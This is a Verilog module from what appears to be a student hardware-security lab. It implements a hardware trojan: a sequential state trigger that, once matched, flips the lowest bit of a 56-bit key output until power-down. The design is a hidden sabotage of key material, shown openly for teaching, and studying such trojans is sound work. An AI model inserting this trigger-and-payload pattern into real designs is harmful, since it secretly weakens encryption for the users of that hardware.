// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
// Experiement 4 Part 3
// 9/17/21

// Description:
//	trojan_seq.v will implement a sequential trigger based on a
//	defined sequence of states. To implement the trigger, a shift
// 	register is used to check the history of states and is then
// 	compared with the trigger condition. If the condition is met,
//	the last bit of the key will be inverted until the board powers 
//	down.
`timescale 1ns/1ns

module  trojan_seq (
input					clk,
input					rst,
input		[55:0]	    key,
input		[1:32]	    trigger,
output reg	[55:0]	    payload
);

// trigger condition defined here, CHANGE STATE VALUES TO TEST NEW TRIGGER CONDITIONS
// STATE0 is the first state for the trigger condition, STATE1 is the next state, etc.
parameter 	STATE0  = 2'b10, 
			STATE1	= 2'b01, 
			STATE2 	= 2'b11;
/////////////////////////////////////////////////////////////////////////////////////

// register definitions
reg [5:0]	state_order;
reg [5:0] 	trigger_cond = {STATE0, STATE1, STATE2};	// trigger_cond holds the state order to meet trigger condition
reg 		trojan_en;
reg			trojan_en_next;
reg [55:0]	payload_next;

//	sequential always block to set state_order and trojan_en reg, and payload output
always @(negedge clk) begin
	if (rst) begin	// rst is high-true
		// default sequential registers and output upon rst
		state_order	<= #1 6'h00;
		trojan_en 	<= #1 1'b0;
		payload 	<= #1 key;
	end else begin
		// assign sequential registers their next value on neg edge of clk
		state_order	<= #1 {state_order[3:0], trigger[31:32]};	// implement shift register to store previous states. shift in lsb trigger bits
		trojan_en 	<= #1 trojan_en_next;
		payload 	<= #1 payload_next; 
	end
end

// 	combinational always block to update trigger_en and payload registers
always @(state_order, trigger_cond, trojan_en) begin
	trojan_en_next = trojan_en;
	payload_next = payload;

	// compare state_order shift register with trigger condition register
	if (state_order == trigger_cond) begin
		trojan_en_next = 1'b1;
	end

	// if trigger condition is met, invert lsb of the key until board powers off
	if (trojan_en) begin
		payload_next <= #1 {key[55:1], ~key[0]};
	end else begin
		payload_next <= #1 key;
	end
end

endmodule